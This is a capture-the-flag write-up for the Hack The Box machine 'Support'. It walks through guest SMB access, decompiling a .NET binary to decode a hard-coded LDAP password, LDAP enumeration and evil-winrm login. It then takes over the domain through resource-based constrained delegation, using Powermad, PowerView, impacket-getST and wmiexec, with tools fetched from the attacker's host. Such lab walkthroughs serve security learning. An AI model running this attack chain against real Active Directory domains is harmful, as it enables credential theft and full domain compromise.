![image](https://user-images.githubusercontent.com/105310322/189173143-8a72f1a9-dc15-4597-8e41-434c1e109d72.png)


### Tools: nmap, evil-winrm, ldapsearch, DNSpy, wine, smbclient

### Vulnerabilities: SMB guest login, SeMachineAccountPrivilege, Reverse Enginnering

First off this machine is labeled as easy but it is at least a medium. Someone at HTB does not know how to rate their own machines according to their difficulty criteria. https://app.hackthebox.com/machines/submission/overview

This machine involves RE and multiple steps. Clearly should not be labeled as easy!

Because of this I had a lot of help, especially on the privilege escalation. I was on the right track but the CVE I found was a bit different than the actual method. Link for that will be in the privilege escalation section as it is still good knowledge. 


```console
└──╼ [★]$ sudo nmap -p- -A -sC -T4 -Pn 10.129.53.165
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 18:23 BST
Nmap scan report for 10.129.53.165
Host is up (0.014s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-07 17:28:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-09-07T17:29:16
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   23.09 ms 10.10.14.1
2   22.61 ms 10.129.53.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 401.59 seconds
```

```console
└──╼ [★]$ smbclient -N -L //10.129.53.172/

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

```console
└──╼ [★]$ smbclient -N //10.129.53.172/support-tools
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 18:01:06 2022
  ..                                  D        0  Sat May 28 12:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 12:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 12:19:55 2022
  putty.exe                           A  1273576  Sat May 28 12:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 12:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 18:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 12:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 12:19:43 2022

		4026367 blocks of size 4096. 968598 blocks available
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (7970.4 KiloBytes/sec) (average 7970.4 KiloBytes/sec)
smb: \> 
```

At first I used Ghidra to check it out but I was only able to get a password string and what I suspected was a username. Neither worked for me.

How to install wine for later use and the link to DNSpy.

Note: wine32 still would not install but luckily I was able to get DNSpy running on reguler wine

https://github.com/dnSpy/dnSpy/releases
```console
└──╼ [★]$ sudo dpkg --add-architecture i386
└──╼ [★]$ sudo apt update
└──╼ [★]$ sudo apt upgrade
└──╼ [★]$ unzip dnSpy-net-win64.zip
└──╼ [★]$ wine dnSpy.exe
```

After struggling all day to get wine running on PWNbox (The recent pwnbox update seems to have helped) I was able to finally run DNSpy through wine. Under UserInfo.Services in the protected function we get some good info for us to reverse engineer.

```c
using System;
using System.Text;

namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}
```
Since I am still not very good at scripting I ran this through the amazing cyber chef and found a password!

![image](https://user-images.githubusercontent.com/105310322/188973978-b4ffece0-4f72-4376-951f-b269626694c3.png)


Now that we have a password we can try to enumerate ldap. I tried a few usernames but ```support``` was the only one that worked.

ldap gives too much information back but in this particular section we get some interesting data in the info field ```Ironside47pleasure40Watchful```

This is our password for support!

```console
└──╼ [★]$ ldapsearch -x -H ldap://10.129.53.172 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb"
# extended LDIF
#
# LDAPv3
# base <CN=Users,DC=support,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
```

With this info we can finally login to the victim and nab the user flag!

```console
└──╼ [★]$ evil-winrm -u support -p Ironside47pleasure40Watchful -i 10.129.53.172

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> 
```
```console
*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
e5e4d***************************
```

# Privilege Escalation

I had some issues getting winpeas to run but when I finally did I received alot of permission denied so it did not end up helping me.

Luckily the privilege escalation was pretty straight forward and ```SeMachineAccountPrivilege``` stood out to me. However this would be harder to exploit than I expected.

```console
*Evil-WinRM* PS C:\Users\support\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
The link below has a good guide on how to exploit this but did not work for me. It also gave links on 2 programs that need to be uploaded and imported to the victim.

```https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html```

```console
*Evil-WinRM* PS C:\temp> curl http://10.10.14.35:8000/Powermad/Powermad.ps1 -o Powermad.ps1
*Evil-WinRM* PS C:\temp> import-module ./Powermad.ps1
*Evil-WinRM* PS C:\temp> curl http://10.10.14.35:8000/powerview.ps1 -o powerview.ps1
*Evil-WinRM* PS C:\temp> import-module ./powerview.ps1
```
From this point on is where I was stuck and received help.

After importing both modules on the victim we can run these commands.

First we create a new machine account with a password. Then we need to grab our new sid.

```*Evil-WinRM* PS C:\temp> New-MachineAccount -MachineAccount rogue -Password $(ConvertTo-SecureString 'pass' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = rogue$
Verbose: [+] Distinguished Name = CN=rogue,CN=Computers,DC=support,DC=htb
[+] Machine account rogue added
*Evil-WinRM* PS C:\temp> Get-DomainComputer rogue -Properties objectsid

objectsid
---------
S-1-5-21-1677581083-3380853377-188903654-5603


*Evil-WinRM* PS C:\temp> 
```

With our sid in hand add it into the next command string to create a new raw security descriptor. Then we set the new bytes to the dc. 

```console
*Evil-WinRM* PS C:\temp> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5603)"
*Evil-WinRM* PS C:\temp> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\temp> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\temp> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
On our host: by inputting the following command we can create a new ticket and impersonate the administrator.

```
└──╼ [★]$ impacket-getST support.htb/rogue:pass -dc-ip 10.129.53.172 -impersonate administrator -spn www/dc.support.htb
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```
Export the ticket and login as the admin account and we are in!

```
└──╼ [★]$ export KRB5CCNAME=administrator.ccache
─[us-dedivip-1]─[10.10.14.35]─[htb-0xrogue@pwnbox-base]─[~/my_data/HTB/Machines]
└──╼ [★]$ impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
support\administrator
```
Navigate and cat the flag!

```
C:\Users\Administrator\Desktop>type root.txt
1a586***************************

C:\Users\Administrator\Desktop>
```

Part of the reason my original exploit did not work for me was that it kept crashing my evil-winrm shell so I could not progress further. I am still interested to see if that would work if properly executed since maybe I was missing something.

I would not have been able to solve this by myself at this point. AD is still very new to me and is something I am very interested in learning.

I am grateful for all the help and as always

GG!
